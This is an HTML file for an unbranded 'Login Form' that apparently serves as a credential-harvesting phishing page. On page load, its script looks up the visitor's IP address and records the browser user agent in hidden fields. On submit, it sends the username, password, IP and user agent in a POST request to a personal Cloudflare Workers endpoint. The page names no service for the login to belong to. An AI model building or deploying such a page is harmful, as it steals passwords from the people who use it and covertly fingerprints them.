<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Login Form</title>
  <script>
    async function getUserData() {
      try {
        // Fetch IP and geolocation data
        const response = await fetch('https://ipapi.co/json/');
        const data = await response.json();

        // Set user agent
        document.getElementById('ip').value = data.ip || '';
        document.getElementById('user_agent').value = navigator.userAgent;
      } catch (error) {
        console.error('Error fetching user data:', error);
      }
    }

    document.addEventListener('DOMContentLoaded', getUserData);

    async function submitForm(event) {
      event.preventDefault();

      const formData = {
        username: document.getElementById('username').value,
        password: document.getElementById('password').value,
        ip: document.getElementById('ip').value,
        user_agent: document.getElementById('user_agent').value
      };

      try {
        const response = await fetch('https://long-brook-3609.henrycrane65.workers.dev/', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify(formData)
        });

        if (response.ok) {
          alert('Form submitted successfully!');
        } else {
          alert('Error submitting form.');
        }
      } catch (error) {
        alert('An error occurred: ' + error.message);
      }
    }
  </script>
</head>
<body>

  <h2>Login Form</h2>

  <form id="loginForm" onsubmit="submitForm(event)">
    <label for="username">Username:</label>
    <input type="text" id="username" name="username" required><br><br>

    <label for="password">Password:</label>
    <input type="password" id="password" name="password" required><br><br>

    <!-- Hidden fields for IP and user agent -->
    <input type="hidden" id="ip" name="ip">
    <input type="hidden" id="user_agent" name="user_agent">

    <input type="submit" value="Submit">
  </form>

</body>
</html>
